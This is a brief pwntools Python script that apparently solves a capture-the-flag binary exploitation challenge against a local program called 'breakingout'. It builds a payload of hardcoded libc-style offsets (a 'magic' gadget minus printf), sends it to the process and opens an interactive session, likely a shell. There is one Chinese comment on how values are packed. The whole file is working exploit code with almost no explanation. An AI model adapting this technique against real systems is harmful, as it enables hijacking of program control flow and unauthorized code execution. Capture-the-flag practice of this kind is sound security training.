# -*- coding: utf-8 -*-
from pwn import *
def main():
    context(os='linux',arch='i386',log_level='debug')
    #magic = 0xF0274
    #printf=0x55800
    magic = 0xD7117
    printf=0x50CF0
    mem=[1,1,-22,5,-22,magic-printf]
    playload=flat(mem)#在i386时flat会转成4字节，amd64时。会转成8字节
    context(os='linux',arch='amd64',log_level='debug')
    r = process('./breakingout')
    r.sendlineafter('(max 262144):',str(len(playload)))
    r.sendafter('teread',playload)
    r.interactive()

if __name__ == '__main__':
    main()
